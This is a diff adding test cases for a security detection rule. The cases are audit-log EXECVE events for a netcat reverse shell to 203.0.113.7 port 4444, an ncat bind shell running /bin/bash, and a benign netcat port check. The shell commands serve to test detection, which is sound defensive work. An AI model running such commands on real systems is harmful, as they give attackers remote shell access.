@@ -1,0 +1,40 @@
+rule_id: dcfa7d5e-4acc-4b0c-8e69-abf528f7a1eb
+cases:
+  - name: Reverse shell to an external listener
+    expect: match
+    event:
+      type: EXECVE
+      a0: nc
+      a1: '-e'
+      a2: /bin/sh
+      a3: 203.0.113.7
+      a4: '4444'
+      comm: nc
+      exe: /usr/bin/nc
+      uid: 33
+      key: exec
+  - name: ncat bind shell with --sh-exec
+    expect: match
+    event:
+      type: EXECVE
+      a0: /usr/bin/ncat
+      a1: '-lvp'
+      a2: '9001'
+      a3: '--sh-exec'
+      a4: /bin/bash
+      comm: ncat
+      exe: /usr/bin/ncat
+      uid: 1000
+      key: exec
+  - name: Port check with netcat
+    expect: no_match
+    event:
+      type: EXECVE
+      a0: nc
+      a1: '-zv'
+      a2: db01.opensoc.local
+      a3: '5432'
+      comm: nc
+      exe: /usr/bin/nc
+      uid: 1000
+      key: exec
